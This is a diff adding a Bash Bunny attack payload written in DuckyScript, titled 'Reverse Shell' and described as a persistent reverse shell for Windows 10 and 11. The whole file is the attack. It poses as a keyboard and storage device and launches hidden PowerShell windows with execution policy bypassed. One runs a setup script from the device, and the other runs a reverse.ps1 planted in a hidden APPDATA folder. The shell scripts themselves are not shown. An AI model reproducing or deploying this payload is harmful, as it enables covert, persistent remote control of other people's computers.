@@ -1,0 +1,31 @@
+# Title:         Reverse Shell
+# Description:   Persistent reverse shell
+# Author:        VVill
+# Category:      Network
+# Attackmodes:   HID STORAGE
+# Target:        Windows 10, 11
+
+LED SETUP
+
+# Configure the Bash Bunny as a HID and Storage Device
+ATTACKMODE HID STORAGE
+
+LED ATTACK
+
+# Run reverse shell setup script
+LED STAGE1
+Q DELAY 500
+RUN WIN powershell -Command "& {Start-Process powershell -ArgumentList ('-ExecutionPolicy Bypass -NoProfile -File \"' + ((Get-Volume -FileSystemLabel BashBunny).DriveLetter + ':\payloads\switch1\setup_reverse_shell.ps1') + '\"') -WindowStyle Hidden}"
+Q DELAY 500
+Q ENTER
+
+DELAY 2000
+
+# Run reverse shell script from hidden location
+LED STAGE2
+Q DELAY 500
+RUN WIN powershell -Command "& {Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -NoProfile -File \"%APPDATA%\HiddenFolder\reverse.ps1\"' -WindowStyle Hidden}"
+Q DELAY 500
+Q ENTER
+
+LED FINISH
